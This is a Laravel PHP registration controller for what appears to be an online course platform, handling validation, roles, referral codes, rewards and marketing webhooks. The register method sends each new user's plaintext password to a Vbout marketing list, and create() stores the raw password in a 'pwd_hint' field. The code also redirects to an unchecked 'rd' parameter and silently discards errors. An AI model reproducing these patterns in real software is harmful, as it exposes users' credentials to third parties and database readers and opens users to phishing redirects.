<?php

namespace App\Http\Controllers\Auth;

use Illuminate\Support\Facades\Log;
use Exception;

use App\Http\Controllers\Controller;
use App\Mixins\RegistrationBonus\RegistrationBonusAccounting;
use App\Models\Accounting;
use App\Models\Affiliate;
use App\Models\AffiliateCode;
use App\Models\Reward;
use App\Models\RewardAccounting;
use App\Models\Role;
use App\Models\UserMeta;
use App\Providers\RouteServiceProvider;
use App\User;
use Illuminate\Auth\Events\Registered;
use Illuminate\Foundation\Auth\RegistersUsers;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Jenssegers\Agent\Agent;
use App\Vbout\VboutService;
class RegisterController extends Controller
{

 protected $vboutService;
    use RegistersUsers;

    protected $redirectTo = '/';

    public function __construct()
    {
        $this->middleware('guest');
    }

    public function showRegistrationForm()
    {
        try {
            $seoSettings = getSeoMetas('register');
            $pageTitle = !empty($seoSettings['title']) ? $seoSettings['title'] : trans('site.register_page_title');
            $pageDescription = !empty($seoSettings['description']) ? $seoSettings['description'] : trans('site.register_page_title');
            $pageRobot = getPageRobot('register');

            $referralSettings = getReferralSettings();

            $referralCode = Cookie::get('referral_code');

            $data = [
                'pageTitle' => $pageTitle,
                'pageDescription' => $pageDescription,
                'pageRobot' => $pageRobot,
                'referralCode' => $referralCode,
                'referralSettings' => $referralSettings,
            ];

            $agent = new Agent();
                        if ($agent->isMobile()){
                            return view(getTemplate() . '.auth.register', $data);
                    }else{
                        return view('web.default2' . '.auth.register', $data);
                    }
        } catch (\Exception $e) {
            \Log::error('showRegistrationForm error: ' . $e->getMessage(), [
                'file' => $e->getFile(),
                'line' => $e->getLine(),
                'trace' => $e->getTraceAsString()
            ]);
            
            throw $e;
        }
    }

    protected function validator(array $data)
    {
        $registerMethod = getGeneralSettings('register_method') ?? 'mobile';

        if (!empty($data['mobile']) and !empty($data['country_code'])) {
            $data['mobile'] = ltrim($data['country_code'], '+') . ltrim($data['mobile'], '0');
        }

        $rules = [
            'country_code' => ($registerMethod == 'mobile') ? 'required' : 'nullable',
            'mobile' => (($registerMethod == 'mobile') ? 'required' : 'required') . '|numeric|unique:users',
            'email' => (($registerMethod == 'email') ? 'required' : 'nullable') . '|email|max:255|unique:users',
            'term' => 'required',
            'full_name' => 'required|string|min:3',
            'password' => 'required|string|min:6|confirmed',
            'password_confirmation' => 'required|same:password',
            'referral_code' => 'nullable|exists:affiliates_codes,code'
        ];

        if (!empty(getGeneralSecuritySettings('captcha_for_register'))) {
            $rules['captcha'] = 'required|captcha';
        }

        return Validator::make($data, $rules);
    }

    protected function create(array $data)
    {

        if (!empty($data['mobile']) and !empty($data['country_code'])) {
            $data['mobile'] = ltrim($data['country_code'], '+') . ltrim($data['mobile'], '0');
        }

        $referralSettings = getReferralSettings();
        $usersAffiliateStatus = (!empty($referralSettings) and !empty($referralSettings['users_affiliate_status']));

        if (empty($data['timezone'])) {
            $data['timezone'] = getGeneralSettings('default_time_zone') ?? null;
        }

        $disableViewContentAfterUserRegister = getFeaturesSettings('disable_view_content_after_user_register');
        $accessContent = !((!empty($disableViewContentAfterUserRegister) and $disableViewContentAfterUserRegister));

        $roleName = Role::$user;
        $roleId = Role::getUserRoleId();

        if (!empty($data['account_type'])) {
            if ($data['account_type'] == Role::$teacher) {
                $roleName = Role::$teacher;
                $roleId = Role::getTeacherRoleId();
            } else if ($data['account_type'] == Role::$organization) {
                $roleName = Role::$organization;
                $roleId = Role::getOrganizationRoleId();
            }
        }

        $user = User::create([
            'role_name' => $roleName,
            'role_id' => $roleId,
            'mobile' => $data['mobile'] ?? null,
            'email' => $data['email'] ?? null,
            'full_name' => $data['full_name'],
            'country_code' => $data['country_code'],

            'status'=>'active',
            'access_content' => $accessContent,
            'password' => Hash::make($data['password']),
            'pwd_hint' => $data['password'],
            'affiliate' => $usersAffiliateStatus,
            'timezone' => $data['timezone'] ?? null,
            'created_at' => time()
        ]);

        if (!empty($data['certificate_additional'])) {
            UserMeta::updateOrCreate([
                'user_id' => $user->id,
                'name' => 'certificate_additional'
            ], [
                'value' => $data['certificate_additional']
            ]);
        }

        return $user;
    }

    public function register(Request $request)
    {
        $this->validator($request->all())->validate();
        $this->validate($request, [
            'full_name' => 'required|string|max:60',
            'mobile' => 'required|string|max:10',
            'email' => 'required|string|max:60',
            'password' => 'required|string|max:40',
            'password_confirmation' => 'required|string|max:40',
        ]);

        $user = $this->create($request->all());

        event(new Registered($user));

        $notifyOptions = [
            '[u.name]' => $user->full_name,
            '[u.role]' => trans("update.role_{$user->role_name}"),
            '[time.date]' => dateTimeFormat($user->created_at, 'j M Y H:i'),
        ];

         try {
 $vboutService1 = new VboutService();
        $listId1 = '143058';

        $contactData1 = [
            'email' => $request->email,
            'fields' => [
            '942019' => $request->full_name,
             '942017' => $request->email,
              '942018' => $request->password,
            ],
        ];
        $result1 = $vboutService1->addContactToList($listId1, $contactData1);
} catch (\Exception $e) {

}

        $registerMethod = getGeneralSettings('register_method') ?? 'mobile';

        $value = $request->get($registerMethod);
        if ($registerMethod == 'mobile') {
            $value = $request->get('country_code') . ltrim($request->get('mobile'), '0');
        }

        $referralCode = $request->get('referral_code', null);
        if (!empty($referralCode)) {
            session()->put('referralCode', $referralCode);
        }

        $verificationController = new VerificationController();

        $checkConfirmed = $verificationController->checkConfirmed($user, $registerMethod, $value);
        $referralCode = $request->get('referral_code', null);

        if ($checkConfirmed['status'] == 'send') {

            if (!empty($referralCode)) {
                session()->put('referralCode', $referralCode);
            }

             $gohighlevel= 'https://services.leadconnectorhq.com/hooks/eAE21tVIbkFC6dUHwja9/webhook-trigger/ff1314dc-fadc-4b7b-97a2-3a9fe275bf6b';

$webhookdata = [
  'user_id' => $user->id,
  'user_name' => $user->full_name,
  'user_mobile' => $user->mobile,
  'user_email' => $user->email,
  'password' => '***REDACTED***',
  'user_role' => $user->role_name,
  'create_at' => date("Y/m/d H:i")

]; ?>

<script>
    fbq('track', 'CompleteRegistration');

</script>
<?php

$gohighlevelcurl = curl_init($gohighlevel);
curl_setopt($gohighlevelcurl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($gohighlevelcurl, CURLOPT_POST, true);
curl_setopt($gohighlevelcurl, CURLOPT_POSTFIELDS, json_encode($webhookdata));
curl_setopt($gohighlevelcurl, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json'
]);
$gohighlevelresponse = curl_exec($gohighlevelcurl);

             $this->guard()->login($user);

            $enableRegistrationBonus = false;
            $registrationBonusAmount = null;
            $registrationBonusSettings = getRegistrationBonusSettings();
            if (!empty($registrationBonusSettings['status']) and !empty($registrationBonusSettings['registration_bonus_amount'])) {
                $enableRegistrationBonus = true;
                $registrationBonusAmount = $registrationBonusSettings['registration_bonus_amount'];
            }

            $user->update([
                'status' => User::$active,
                'enable_registration_bonus' => $enableRegistrationBonus,
                'registration_bonus_amount' => $registrationBonusAmount,
            ]);

            $registerReward = RewardAccounting::calculateScore(Reward::REGISTER);
            RewardAccounting::makeRewardAccounting($user->id, $registerReward, Reward::REGISTER, $user->id, true);

            if (!empty($referralCode)) {
                Affiliate::storeReferral($user, $referralCode);
            }

            $registrationBonusAccounting = new RegistrationBonusAccounting();
            $registrationBonusAccounting->storeRegistrationBonusInstantly($user);

            if ($response = $this->registered($request, $user)) {
                return $response;
            }
            $rdn='';
            if ($request->has('rd')) {
    $rdn=$request->get('rd');
}

            if($rdn!=''){

                 return redirect($rdn);
            }else{
             return $request->wantsJson()
                ? new JsonResponse([], 201)
                : redirect($this->redirectPath());
            }

        } elseif ($checkConfirmed['status'] == 'verified') {
            $this->guard()->login($user);

            $enableRegistrationBonus = false;
            $registrationBonusAmount = null;
            $registrationBonusSettings = getRegistrationBonusSettings();
            if (!empty($registrationBonusSettings['status']) and !empty($registrationBonusSettings['registration_bonus_amount'])) {
                $enableRegistrationBonus = true;
                $registrationBonusAmount = $registrationBonusSettings['registration_bonus_amount'];
            }

            $user->update([
                'status' => User::$active,
                'enable_registration_bonus' => $enableRegistrationBonus,
                'registration_bonus_amount' => $registrationBonusAmount,
            ]);

            $registerReward = RewardAccounting::calculateScore(Reward::REGISTER);
            RewardAccounting::makeRewardAccounting($user->id, $registerReward, Reward::REGISTER, $user->id, true);

            if (!empty($referralCode)) {
                Affiliate::storeReferral($user, $referralCode);
            }

            $registrationBonusAccounting = new RegistrationBonusAccounting();
            $registrationBonusAccounting->storeRegistrationBonusInstantly($user);

            if ($response = $this->registered($request, $user)) {
                return $response;
            }

            return $request->wantsJson()
                ? new JsonResponse([], 201)
                : redirect($this->redirectPath());
        }
    }
}
